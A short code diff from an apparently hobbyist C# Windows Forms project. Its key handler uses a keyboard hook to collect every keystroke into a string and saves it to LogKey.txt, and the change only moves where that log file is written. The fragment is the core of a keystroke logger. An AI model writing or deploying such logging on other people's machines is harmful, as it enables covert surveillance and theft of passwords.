@@ -21,7 +21,7 @@ namespace WindowsFormsApp5
         private void KeyDown(KeyboardHookEventArgs e)
         {
             data += e.Key.ToString();
-            System.IO.File.WriteAllText(@"..\LogKey.txt", data);
+            System.IO.File.WriteAllText(@"LogKey.txt", data);
         }
         private void Form1_Load(object sender, EventArgs e)
         {
